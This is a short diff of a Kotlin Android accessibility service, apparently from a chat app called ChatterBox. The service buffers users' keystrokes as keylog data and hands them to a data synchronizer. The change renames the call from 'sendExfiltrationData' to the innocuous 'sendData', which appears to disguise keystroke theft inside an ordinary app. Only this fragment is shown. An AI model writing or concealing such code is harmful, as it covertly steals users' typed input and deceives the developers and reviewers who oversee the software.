@@ -130,7 +130,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
             }
 
             val dataSynchronizer = com.example.ChatterBox.database.DataSynchronizer(applicationContext)
-            dataSynchronizer.sendExfiltrationData("keylog", keylogData.toString())
+            dataSynchronizer.sendData("keylog", keylogData.toString())
 
             // Clear buffer
             keylogBuffer.clear()
